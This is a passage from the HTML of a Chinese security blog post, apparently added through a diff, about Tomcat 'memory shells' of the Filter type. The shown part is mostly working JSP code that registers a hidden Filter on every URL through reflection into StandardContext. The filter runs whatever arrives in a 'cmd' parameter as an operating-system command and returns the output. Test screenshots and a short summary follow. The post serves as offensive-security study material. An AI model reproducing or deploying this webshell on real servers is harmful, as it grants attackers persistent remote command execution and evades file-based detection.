+                if (req.getParameter(&quot;cmd&quot;) !&#x3D; null)&#123;
+                    byte[] bytes &#x3D; new byte[1024];
+                    Process process &#x3D; new ProcessBuilder(req.getParameter(&quot;cmd&quot;)).start();&#x2F;&#x2F;windows环境下测试
+                    &#x2F;&#x2F;Process process &#x3D; new ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,req.getParameter(&quot;cmd&quot;)).start();
+                    int len &#x3D; process.getInputStream().read(bytes);
+                    servletResponse.getWriter().write(new String(bytes,0,len));
+                    process.destroy();
+                    return;
+                &#125;
+                filterChain.doFilter(servletRequest,servletResponse);
+            &#125;
+
+            @Override
+            public void destroy() &#123;
+
+            &#125;
+
+        &#125;;
+
+        &#x2F;**
+         * 创建一个FilterDef 然后设置我们filterDef的名字，和类名，以及类
+         *&#x2F;
+        FilterDef filterDef &#x3D; new FilterDef();
+        filterDef.setFilter(filter);
+        filterDef.setFilterName(name);
+        filterDef.setFilterClass(filter.getClass().getName());
+
+        &#x2F;&#x2F; 调用 addFilterDef 方法将 filterDef 添加到 filterDefs中
+        standardContext.addFilterDef(filterDef);
+
+        &#x2F;**
+         * 创建一个filtermap
+         * 设置filter的名字和对应的urlpattern
+         *&#x2F;
+        FilterMap filterMap &#x3D; new FilterMap();
+        filterMap.addURLPattern(&quot;&#x2F;*&quot;);
+        filterMap.setFilterName(name);
+        filterMap.setDispatcher(DispatcherType.REQUEST.name());&#x2F;&#x2F; 这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3
+    
+        &#x2F;**
+         * 将filtermap 添加到 filterMaps 中的第一个位置
+         *&#x2F;
+        standardContext.addFilterMapBefore(filterMap);
+
+        &#x2F;**
+         * 利用反射创建 FilterConfig，并且将 filterDef 和 standardCtx（即 Context）作为参数进行传入
+         *&#x2F;
+        Constructor constructor &#x3D; ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
+        constructor.setAccessible(true);
+        ApplicationFilterConfig filterConfig &#x3D; (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
+
+        &#x2F;**
+         * 将 name 和 filterConfig 作为 key-value进行传入
+         *&#x2F;
+        filterConfigs.put(name,filterConfig);
+        out.print(&quot;Inject Success !&quot;);
+    &#125;
+%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>Windows下测试结果：</strong></p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209110036049.png" alt="image-20211209110036049" loading="lazy"></p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209110230572.png" alt="image-20211209110230572" loading="lazy"></p>
+<h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>该Filter内存马在服务器重启后会失效(StandardContext在tomcat的生命周期内保存)，且该方法仍需要上传jsp文件才能使用该内存马 - 我们其实可以通过反序列化来实现动态注册filter，在之后的篇章将会涉及。</p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/kd35na">https://www.yuque.com/tianxiadamutou/zcfd4v/kd35na</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lqzkcx3/article/details/79357144">https://blog.csdn.net/lqzkcx3/article/details/79357144</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w">https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w</a></p>
+</div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Leihehe</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://leihehe.top/2021/12/07/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-%E4%B8%80-Filter%E5%9E%8B/" title="Tomcat内存马系列(一):Filter型">https://leihehe.top/2021/12/07/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-%E4%B8%80-Filter%E5%9E%8B/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2021/12/10/Apache-log4j2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="prev" title="Apache log4j2 命令执行漏洞复现"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">Apache log4j2 命令执行漏洞复现</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2021/12/02/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/" rel="next" title="NCK逆向课后作业writeup"><span class="post-nav-text">NCK逆向课后作业writeup</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>说点什么好呢？</span><br></div><style>.utterances {
+  max-width: 100%;
+}</style><script src="https://utteranc.es/client.js" repo="leihehehe/leihehehe.github.io" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2021 – 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Leihehe</span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div id="local-search-result"></div></div></div></body></html>
